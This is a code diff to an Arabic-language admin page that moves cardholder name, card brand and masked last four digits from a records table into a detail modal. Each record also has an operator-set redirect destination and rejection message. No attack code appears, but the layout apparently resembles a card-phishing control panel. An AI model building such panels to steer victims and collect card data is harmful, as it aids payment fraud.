@@ -482,9 +482,6 @@
               <th>رقم الجوال</th>
               <th>الاسم</th>
               <th>البريد</th>
-              <th>اسم صاحب البطاقة</th>
-              <th>نوع البطاقة</th>
-              <th>آخر 4 أرقام</th>
               <th>عنوان التوصيل</th>
               <th>الحالة</th>
               <th>الإجراءات</th>
@@ -517,6 +514,9 @@
       <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
       <div class="modal-row"><span class="k">البريد</span><span class="v" id="mEmail"></span></div>
       <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+      <div class="modal-row"><span class="k">اسم صاحب البطاقة</span><span class="v" id="mCardName">-</span></div>
+      <div class="modal-row"><span class="k">نوع البطاقة</span><span class="v" id="mCardBrand">-</span></div>
+      <div class="modal-row"><span class="k">آخر 4 أرقام</span><span class="v" id="mCardLast4">-</span></div>
       <div class="modal-row"><span class="k">وجهة التوجيه</span><span class="v" id="mRedirect">لم يتم تحديدها</span></div>
       <div class="modal-row"><span class="k">رسالة الرفض</span><span class="v" id="mRejection">لا توجد</span></div>
       <div class="modal-actions">
@@ -674,9 +674,6 @@
           '<td>' + escapeHtml(r.phone || r.mobile || '-') + '</td>' +
           '<td>' + escapeHtml(r.name || '-') + '</td>' +
           '<td>' + escapeHtml(r.email || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardName || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardBrand || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardLast4 ? '**** ' + r.cardLast4 : '-') + '</td>' +
           '<td>' + escapeHtml(r.address || '-') + '</td>' +
           '<td><span class="status-badge ' + st.cls + '">' + st.text + '</span></td>' +
           '<td><div class="row-actions">' +
@@ -785,6 +782,9 @@
       document.getElementById('mPhone').textContent = r.phone || r.mobile || '-';
       document.getElementById('mEmail').textContent = r.email || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
+      document.getElementById('mCardName').textContent = r.cardName || '-';
+      document.getElementById('mCardBrand').textContent = r.cardBrand || '-';
+      document.getElementById('mCardLast4').textContent = r.cardLast4 ? '**** ' + r.cardLast4 : '-';
       document.getElementById('mRedirect').textContent = r.redirectUrl || 'لم يتم تحديدها';
       document.getElementById('mRejection').textContent = r.rejectionMessage || 'لا توجد';
       var isPending = r.status === 'pending' || !r.status;
